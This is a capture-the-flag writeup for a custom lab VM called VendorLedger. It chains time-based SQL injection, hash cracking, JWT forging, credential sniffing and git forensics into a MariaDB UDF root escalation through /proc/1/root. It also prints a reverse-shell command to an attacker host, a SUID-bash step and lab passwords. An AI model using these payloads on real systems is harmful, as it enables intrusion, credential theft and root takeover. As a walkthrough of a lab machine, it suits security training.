# VendorLedger — writeup (current build)

> Status: **complete**. This documents the challenge as it exists on the
> current VM build. The chain ends with a root shell via the MariaDB UDF
> privilege escalation. See `writeup.md` for the original *historical* design
> (which included an upload bypass and an `export.php` eval RCE; both are no
> longer present in this build).

## Chain

```
recon (vendor.fenrir)
  -> blind SQLi on /search.php            (dump creds)
  -> login as admin
  -> /export.php "debug" trigger          (leak maintenance subdomain)
  -> maintenance host: guest login (no password)
  -> crack weak JWT secret, forge role=technician
  -> technician console + download mainpage_check.zip
  -> run tool (mainpage_check.exe) -> sniff its POST   [dev-mainpage creds]
  -> login dev-mainpage -> JSON leaks next target + creds
  -> gitea (private repo forensics -> recover SSH creds for fenrir)
  -> ssh fenrir@<box> (no sudo/lxd)
  -> MySQL UDF (dbops/sunshine, mariadbd-as-root) -> root.txt
```

Hosts involved:
- Main app: `http://vendor.fenrir/` (alias `vendorledger.local`)
- Maintenance node: `http://maintenance_v001noreleased-debug-mode.vendor.fenrir/`
  (wildcard vhost `*.vendor.fenrir`)
- Dev-mainpage node: `http://dev-mainpage0080812569927.vendor.fenrir/`
  (exact `ServerName`, wins over the wildcard)
- Gitea: `http://gitea-developmentfenrir-corp-unittesting-alphabeta.vendor.fenrir/`
  (exact `ServerName`; Apache reverse-proxies to Gitea on `127.0.0.1:3000`)

DNS: add name resolution on the attacking box (or use `Host:` header):

```bash
echo "127.0.0.1 maintenance_v001noreleased-debug-mode.vendor.fenrir dev-mainpage0080812569927.vendor.fenrir gitea-developmentfenrir-corp-unittesting-alphabeta.vendor.fenrir vendor.fenrir" | sudo tee -a /etc/hosts
```

## 0. Recon

```bash
nmap -sV -p- <ip>
# 22/tcp ssh   80/tcp http   (3306 not exposed)
#   http-title: VendorLedger - vendor.fenrir
#   (header X-Vendor-Host: vendor.fenrir -> the vhost name is discoverable)
```

Browse `http://vendor.fenrir/` -> "VendorLedger" invoice tracker.
Pages: `/index.php`, `/search.php`, `/login.php`, `/export.php`.
(No `/upload.php` — the upload feature was removed in this build.)

## 1. Blind (time-based) SQL injection

`/search.php?po_number=` concatenates the parameter straight into
`LIKE '%...%'` and only returns found / not-found:

```php
$sql = "SELECT COUNT(*) AS c FROM invoices WHERE po_number LIKE '%" . $po . "%'";
```

Manual time-based proof:

```bash
time curl -s -o /dev/null \
  --data-urlencode "po_number=%' AND SLEEP(5)-- -" -G "http://vendor.fenrir/search.php"
# ~40s (SLEEP runs once per matching row; the table has 8 invoices)
```

Dump the users table (time-based only):

```bash
sqlmap -u "http://vendor.fenrir/search.php?po_number=PO" \
  --technique=T --dbms=mysql --batch \
  --dump -D vendorledger -T users
# admin   : 0571749e2ac330a7455809c6b0e7af90
# finance : e10adc3949ba59abbe56e057f20f883e
```

The runtime DB user is over-granted `SELECT` on `mysql.*`, so the DB accounts can
also be enumerated (needed for the later pivot):

```bash
sqlmap -u "http://vendor.fenrir/search.php?po_number=PO" \
  --technique=T --dbms=mysql --batch \
  --dump -D mysql -T user -C User,Host
# -> vledger, dbops, root   (see README table)
```

## 2. Crack the hash, log in

```bash
hashcat -m 0 0571749e2ac330a7455809c6b0e7af90 rockyou.txt
# 0571749e2ac330a7455809c6b0e7af90:sunshine

curl -s -c cookies.txt -d 'username=admin&password=sunshine' http://vendor.fenrir/login.php
```

(`dbops` reuses this same password — kept for the future MySQL pivot.)

## 3. export.php — enumeration leak (no RCE)

`/export.php` requires a session. Its template field no longer evaluates PHP
(the old `eval()` was removed). Instead, if the submitted template contains the
string `debug` (case-insensitive), it returns a banner that leaks the internal
maintenance node:

```bash
curl -s -b cookies.txt --data-urlencode "id=1" \
  --data-urlencode "template=debug" http://vendor.fenrir/export.php
```

Output:

```
=== VendorLedger export-service :: DEBUG MODE ===
build v001 (unreleased)
maintenance node: http://maintenance_v001noreleased-debug-mode.vendor.fenrir/
```

Any other template renders safely (only `po_number`, `vendor`, `amount`,
`status` are substituted).

## 4. Maintenance host — guest login + JWT role escalation

The maintenance app (`index.php`) issues a JWT on login. Guest access needs no
password:

```bash
curl -s -c m.txt -d 'username=guest' \
  http://maintenance_v001noreleased-debug-mode.vendor.fenrir/ -o guest.html
# role: guest ; JWT is only in the maint_token cookie (read it via DevTools -> F12)
```

JWT layout: `base64url(header).base64url(payload).base64url(HMAC-SHA256)`,
claims `{"sub","role","iat","exp"}`. The secret is **hardcoded and weak**:

```php
const JWT_SECRET = 'maintenance';
```

`/technician.php` and `/download.php` accept the token via cookie `maint_token`
**or** `Authorization: Bearer`. As guest they return `403`.

### Crack the secret

```bash
hashcat -m 16500 token.txt rockyou.txt     # -> maintenance
```

### Forge role=technician and re-sign

```bash
python3 - <<'EOF'
import hmac, hashlib, base64, json, time
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
h = b64(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(',',':')).encode())
p = b64(json.dumps({"sub":"guest","role":"technician",
                    "iat":int(time.time()), "exp":int(time.time())+3600},
                   separators=(',',':')).encode())
s = b64(hmac.new(b"maintenance", f"{h}.{p}".encode(), hashlib.sha256).digest())
print(f"{h}.{p}.{s}")
EOF
```

```bash
HOST=maintenance_v001noreleased-debug-mode.vendor.fenrir
TOK=<forged token>
curl -s -H "Cookie: maint_token=$TOK" "http://$HOST/technician.php"   # 200 Technician Console
curl -s -H "Authorization: Bearer $TOK" "http://$HOST/technician.php" # 200 (same)
```

The technician console lists files from `files/` and exposes
`download.php?file=<name>`:

```bash
curl -s -o /dev/null -w '%{http_code}\n' \
  -H "Cookie: maint_token=$TOK" "http://$HOST/download.php?file=x"
# 404 for unknown names (safe basename() stub)
```

`files/` now ships the dev-mainpage check tool:

```bash
curl -s -o mainpage_check.zip \
  -H "Cookie: maint_token=$TOK" "http://$HOST/download.php?file=mainpage_check.zip"
```

## 5. dev-mainpage — obfuscated tool leaks credentials

The downloaded `mainpage_check.zip` contains a PyArmor + PyInstaller Windows
executable (`mainpage_check.exe`), obfuscated — no Python required. Run it
directly on Windows, or on Linux via `wine mainpage_check.exe`. It resolves the
dev-mainpage host (and reminds you if the name is missing from `hosts`), then
**POSTs `username`/`password` over plain HTTP**.

Start a capture first, so the POST body is visible:

```bash
sudo wireshark                 # or: sudo tcpdump -A -s0 port 80
wine mainpage_check.exe        # Windows: run mainpage_check.exe directly
# [*] dev-mainpage0080812569927.vendor.fenrir -> <ip>
# [+] dev-mainpage0080812569927.vendor.fenrir : server alive
```

In the capture:

```
username=72364591234&password=ZSr2Wf{ifj[:7-5Uxq9LKSBn([v!ME
```

Log those credentials into the dev-mainpage web login:

```bash
curl -s -c d.txt -d 'username=72364591234&password=ZSr2Wf{ifj[:7-5Uxq9LKSBn([v!ME' \
  http://dev-mainpage0080812569927.vendor.fenrir/
```

Success returns a JSON page leaking the **next target and its credentials**:

```json
{
  "service": "dev-mainpage",
  "status": "ok",
  "message": "server alive",
  "next_target": {
    "host": "gitea-developmentfenrir-corp-unittesting-alphabeta.vendor.fenrir",
    "service": "gitea",
    "credentials": {
      "username": "fenrir-corp",
      "password": "%.M8Q61*i+tykaCm}Y3$FPYiNb9/D6"
    }
  }
}
```

The dev-mainpage password is stored **bcrypt-hashed** server-side; the plaintext
only exists inside the obfuscated tool and in the sniffed traffic.

## 6. Gitea — private repo forensics

Gitea 1.22.6 is installed on the box (`/usr/local/bin/gitea`), runs as the `git`
user under systemd (`gitea.service`) on `127.0.0.1:3000`, and is published through
Apache at `http://gitea-developmentfenrir-corp-unittesting-alphabeta.vendor.fenrir/`
(reverse proxy, `ProxyPass / http://127.0.0.1:3000/`). SQLite DB, registration
disabled, SSH disabled.

Login with the credentials leaked by dev-mainpage:

```
username: fenrir-corp
password: %.M8Q61*i+tykaCm}Y3$FPYiNb9/D6
```

Inside there is a **private repo** `fenrir-deploy` (Ansible ops repo). HEAD is
clean (`ansible_ssh_pass={{ vault_ssh_pass }}`), so the player must do **git
forensics** to recover SSH credentials for the box:

**Layer 1 — history (easy).** The plaintext is still in the `Initial import`
commit; the creds were rotated into Ansible Vault later but never scrubbed:

```bash
git log -S'ansible_ssh_pass=' -p -- inventory.ini
# +ansible_ssh_pass=thismachinemadebyrizkyfebrianafif
```

**Layer 2 — hidden ref (medium).** A non-standard ref survives on the server and
is advertised by `ls-remote` but not fetched by a normal `clone`:

```bash
git ls-remote origin                 # shows refs/archive/legacy-dbg
git fetch origin 'refs/archive/*:refs/archive/*'
git show refs/archive/legacy-dbg:dump/all_vars.json
# {"ansible_user":"fenrir","ansible_ssh_pass":"dGhpc21hY2hpbmVtYWRlYnlyaXpreWZlYnJpYW5hZmlm",...}
echo dGhpc21hY2hpbmVtYWRlYnlyaXpreWZlYnJpYW5hZmlm | base64 -d   # -> thismachinemadebyrizkyfebrianafif
```

**Layer 3 — decoy.** `group_vars/all/vault.yml` (fake encrypted blob) and
`docs/onboarding.md` ("ask #ops-tools for the vault password") are dead ends.

Recovered credentials log into the machine over SSH:

```
user:     fenrir
password: thismachinemadebyrizkyfebrianafif
```

Once in, read the first flag:

```bash
cat /home/fenrir/user.txt
```

(The live box's `fenrir` password is set to this value. `fenrir` is
**deliberately not** in the `sudo` or `lxd` groups, so there is no trivial
`sudo -i`/LXD root. `root` / `4f1$Rvm4WYaK6W)q}{S1fu.PRL:pe(` is set explicitly by `provision.sh`
(`ROOT_PASS`), but not leaked to players — the intended root path is the MySQL
UDF privesc below.)

> **Consistency:** the repo leak (`gitea/build_repo.sh`, `PLAIN=`) and
> `provision.sh` (`FENRIR_PASS`) both carry `thismachinemadebyrizkyfebrianafif`,
> matching the live box — the git-forensics step yields a password that works.

## 7. Post-SSH -> root (MySQL UDF)

### 7.1 Why this path

- `fenrir` is unprivileged: not in `sudo` or `lxd` (removed on the live box and
  enforced in `provision.sh` via `deluser`). There is no `sudo -i` shortcut.
- There is no web RCE: `export.php`'s `eval()` was removed; it is an
  enumeration surface only.
- The DB account `dbops` reuses the admin password (`sunshine`) and has
  `ALL PRIVILEGES ON *.*`, including `FILE`.
- MariaDB listens on `127.0.0.1:3306` only, and its systemd drop-in
  `config/mysql-root-override.conf` replaces `User=mysql` with `User=root` /
  `ExecStart=/usr/sbin/mariadbd --user=root`.
- `config/99-vendorledger.cnf` sets `secure_file_priv = ""`, so both
  `LOAD_FILE()` and `... INTO DUMPFILE` are unrestricted.

The UDF therefore runs inside a **root-owned** `mariadbd` process, and
`system()` in the UDF executes as root.

### 7.2 Build the UDF

Use `exploits/raptor_udf2.c` (EDB-1518; exports `do_system` and
`do_system_init`). Copy it to the box (for example with `scp`) and compile it
there so the ABI matches:

```bash
cd /tmp
gcc -g -c raptor_udf2.c
gcc -g -shared -o raptor_udf2.so raptor_udf2.o -lc
chmod 644 raptor_udf2.so
ls -l raptor_udf2.so      # ~17 KB, ELF 64-bit x86-64
```

### 7.3 Connect and confirm the misconfig

```bash
mysql -h127.0.0.1 -udbops -psunshine
```

```sql
SELECT @@version, @@plugin_dir, @@secure_file_priv;
SHOW GRANTS FOR CURRENT_USER();
-- GRANT ALL PRIVILEGES ON *.* TO `dbops`@`localhost` ...
```

`mariadbd` is running as root:

```bash
ps -o user,pid,args -C mariadbd
# root ... /usr/sbin/mariadbd --user=root
```

### 7.4 First failure: `plugin_dir` is read-only in the service namespace

The direct write fails:

```sql
SELECT LOAD_FILE('/tmp/raptor_udf2.so')
INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
-- ERROR 1 (HY000): Can't create/write to file ... (Errcode: 30 "Read-only file system")
```

Why: Ubuntu's `/lib/systemd/system/mariadb.service` ships:

```ini
ProtectSystem=full
ProtectHome=true
PrivateTmp=false
```

plus the `User=root` drop-in. `ProtectSystem=full` bind-mounts `/usr` and
`/etc` read-only **inside the service's mount namespace**; `ProtectHome=true`
replaces `/home` and `/root` with an inaccessible tmpfs. `PrivateUsers=no`
(confirmed with `systemctl show mariadb -p PrivateUsers`), so the process is
host root with full capabilities — only the mount namespace is restricted.

`CREATE FUNCTION` also cannot be given a path: MariaDB's
`check_valid_path()` rejects `/` and `\`, and `sql_udf.cc` builds
`dlpath = opt_plugin_dir + "/" + SONAME`. The library must therefore be a
bare filename in `/usr/lib/mysql/plugin/`.

### 7.5 Bypass: write through `/proc/1/root`

`/proc/1/root` is a magic symlink to PID 1's root. It carries PID 1's mount
view (the host's, where `/usr` is still rw), so it bypasses the service's bind
mounts. Proof that it also bypasses `ProtectHome`:

```sql
SELECT LENGTH(LOAD_FILE('/proc/1/root/root/.bashrc'));  -- 3106
-- /root/.bashrc is readable even though /root is masked in the service ns
```

Write the `.so` through that magic link:

```sql
SELECT LENGTH(LOAD_FILE('/tmp/raptor_udf2.so'));  -- 17480

SELECT LOAD_FILE('/tmp/raptor_udf2.so')
INTO DUMPFILE '/proc/1/root/usr/lib/mysql/plugin/raptor_udf2.so';

SELECT LENGTH(LOAD_FILE('/usr/lib/mysql/plugin/raptor_udf2.so'));  -- 17480
```

This works because MariaDB's `create_file()` (`sql/sql_class.cc`) does not
`realpath()` the target: `fn_format(... MY_UNPACK_FILENAME | MY_RELATIVE_PATH)`
preserves `/proc/1/root`, `is_secure_file_path()` passes because
`secure_file_priv` is empty, and `mysql_file_create(..., 0644,
O_WRONLY|O_EXCL)` follows the magic link into the host's `/usr`. The final
file is mode `0644` (the code also does `fchmod(..., 0644)`), so it is
readable by the server and by `LOAD_FILE`.

### 7.6 Load and execute the UDF

```sql
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';

SELECT do_system('id > /tmp/udf.id 2>&1; chmod 644 /tmp/udf.id');
```

Read the result from the `fenrir` shell:

```bash
cat /tmp/udf.id
# uid=0(root) gid=0(root) groups=0(root)
```

At this point arbitrary commands run as root. The UDF is in the `mariadbd`
mount namespace, so `/root` is still masked; use `/proc/1/root/root/...` when
touching root's home.

### 7.7 Root shell

Option A — reverse shell (recommended, no setuid changes):

```bash
# attacker
nc -lvnp 4444
```

```sql
SELECT do_system('nohup /bin/bash -c "/bin/bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" >/dev/null 2>&1 &');
```

The shell is root immediately because it is a child of the root `mariadbd`.
If `/dev/tcp` is unavailable, use a SUID bash instead.

Option B — SUID bash (no network):

```sql
SELECT do_system('cp /proc/1/root/usr/bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash');
```

```bash
/var/tmp/rootbash -p
id
```

`-p` is required; otherwise bash drops the effective uid. Do **not** try
`chmod +s /bin/bash`: `/bin` is a symlink to `/usr/bin`, and `/usr` is
read-only in the service namespace (EROFS). If `/var/tmp` is mounted
`nosuid`/`noexec`, set the bit on the host bash through the magic link instead
and revert it afterwards:

```sql
SELECT do_system('chmod 4755 /proc/1/root/usr/bin/bash');
-- from fenrir: bash -p ; later:
SELECT do_system('chmod 0755 /proc/1/root/usr/bin/bash');
```

### 7.8 Read the root flag

`LOAD_FILE('/root/root.txt')` returns `NULL` even as root: MariaDB's
`Item_load_file::val_str()` (`sql/item_strfunc.cc`) rejects files without
`S_IROTH` (world-readable). `root.txt` is `0600`. This is a MariaDB check,
not a UNIX permission failure. `LOAD_FILE('/etc/shadow')` fails for the same
reason. Use the UDF plus `cp`:

```sql
SELECT do_system('cp /proc/1/root/root/root.txt /tmp/root.txt; chmod 644 /tmp/root.txt');
```

```bash
cat /tmp/root.txt
# get the price here https://tinyurl.com/3adzmzhj
ls -l /tmp/root.txt   # 48 bytes
md5sum /tmp/root.txt  # fb3ec20e793c68795c87e4550b145843
```

`/tmp` is shared because `PrivateTmp=false`; if it were private, use another
shared path or read the flag through the root shell.

### 7.9 Cleanup

Remove the plugin through `/proc/1/root` (the direct `/usr` path is still
read-only in the service namespace), then drop the function:

```sql
SELECT do_system('rm -f /proc/1/root/usr/lib/mysql/plugin/raptor_udf2.so /tmp/udf.id /tmp/root.txt /var/tmp/rootbash');
DROP FUNCTION do_system;
```

If the host bash was setuid'd, restore it:

```sql
SELECT do_system('chmod 0755 /proc/1/root/usr/bin/bash');
```

### 7.10 Result

```text
user.txt: oke, you find me...
root.txt: get the price here https://tinyurl.com/3adzmzhj
```

## Appendix — current build notes

- **Reproducible from this bundle:** `sudo bash provision.sh` stands up all four
  HTTP hosts + Gitea + the SSH target on a fresh Ubuntu 22.04 (no OVA). See
  `README.md`. Live machine configs were captured into `config/`, `webapp/`,
  `maintenance/`, `dev-mainpage/`, `gitea/`, `db/`.
- Upload feature removed: `upload.php`, `uploads/`, `UPLOAD_*` constants, nav link.
- `vendorledger.conf`: `ServerName vendor.fenrir`, `ServerAlias vendorledger.local`,
  and `Header always set X-Vendor-Host "vendor.fenrir"` (so a scan reveals the
  vhost); the app page title also carries `- vendor.fenrir`.
- `zz-maintenance-debug.conf`: maintenance vhost (`ServerAlias *.vendor.fenrir`,
  `CGIPassAuth On` so the `Authorization` header reaches PHP).
- Maintenance docroot: `/var/www/maintenance_v001noreleased-debug-mode`
  (`index.php`, `technician.php`, `download.php`, `files/mainpage_check.zip`).
- `zz-dev-mainpage.conf`: exact `ServerName dev-mainpage0080812569927.vendor.fenrir`
  (beats the `*.vendor.fenrir` wildcard). Docroot
  `/var/www/dev-mainpage0080812569927` (`index.php`: login + JSON).
- `zz-gitea.conf`: exact `ServerName gitea-developmentfenrir-corp-unittesting-alphabeta.vendor.fenrir`,
  reverse proxy to `127.0.0.1:3000`. Gitea config `/etc/gitea/app.ini`, data
  `/var/lib/gitea`, service `gitea.service` (user `git`).
- Gitea user `fenrir-corp` owns private repo `fenrir-deploy`
  (8 commits on `main` + hidden commit on `refs/archive/legacy-dbg`).
- Live box `fenrir` password set to `thismachinemadebyrizkyfebrianafif`; `root`
  password set explicitly by `provision.sh` (`ROOT_PASS=4f1$Rvm4WYaK6W)q}{S1fu.PRL:pe(`) (root SSH
  login blocked by the default `PermitRootLogin prohibit-password`). `fenrir` is **not** in `sudo`/`lxd`; root
  is reached only via the MySQL UDF privesc (section 7).
- Build sources live in `tool/` (`mainpage_check.py`, `README.txt`, and the
  PyArmor + PyInstaller bundle `mainpage_check.exe` inside `mainpage_check.zip`).
- **Consistent:** the gitea leak (`gitea/build_repo.sh`, `PLAIN=`) now carries the
  live `fenrir` password `thismachinemadebyrizkyfebrianafif` (re-seeded).
- If the hardcoded secret `maintenance` is not in your wordlist, pick another
  common rockyou word so the token stays crackable.
